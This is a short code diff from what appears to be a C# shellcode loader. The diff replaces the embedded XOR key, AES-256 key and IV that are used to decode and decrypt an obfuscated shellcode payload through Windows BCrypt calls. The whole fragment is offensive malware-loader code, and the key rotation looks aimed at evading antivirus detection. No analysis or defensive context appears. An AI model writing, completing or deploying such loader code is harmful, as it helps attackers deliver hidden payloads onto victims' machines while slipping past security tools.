@@ -102,7 +102,7 @@ namespace ShellcodeLoader
             shellcode = Convert.FromBase64String(Encoding.UTF8.GetString(shellcode));
 
             // XOR decryption
-			var xorKey = Convert.FromBase64String("pNMKwJ5lxBd4RiRT/2LlAW8W9rM1+v6QxBf1tkLarXo="); // XOR key
+			var xorKey = Convert.FromBase64String("/6JQOK0mVvckHAUXuGVmVWpv3bghxwkdG5vZVXKJz0k="); // XOR key
             shellcode = XORDecrypt(shellcode, xorKey);
 
             // AES decryption process
@@ -116,13 +116,13 @@ namespace ShellcodeLoader
             if (ntStatus != 0)
                 throw new Exception("BCryptSetProperty failed with status " + ntStatus);
 
-			var key = Convert.FromBase64String("1yrusrtbzaNxAh/H+bCFA35ZynWYgHm4OEPN33x4oOE="); // AES-256 key
+			var key = Convert.FromBase64String("ALygtcTq8av/RHunfsunlnPgKvlOKlyD2SMU+q3xcN0="); // AES-256 key
             var hKey = IntPtr.Zero;
             ntStatus = BCryptGenerateSymmetricKey(hAlgorithm, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
             if (ntStatus != 0)
                 throw new Exception("BCryptGenerateSymmetricKey failed with status " + ntStatus);
 
-			var iv = Convert.FromBase64String("ZRb+Yr8DQSMhBMKOgetARg=="); // AES IV
+			var iv = Convert.FromBase64String("xBRBUynh4re1tqAaj9DMQg=="); // AES IV
             var decryptedShellcode = new byte[shellcode.Length];
             uint decryptedShellcodeSize;
             ntStatus = BCryptDecrypt(hKey, shellcode, (uint)shellcode.Length, IntPtr.Zero, iv, (uint)iv.Length, decryptedShellcode, (uint)shellcode.Length, out decryptedShellcodeSize, 0);
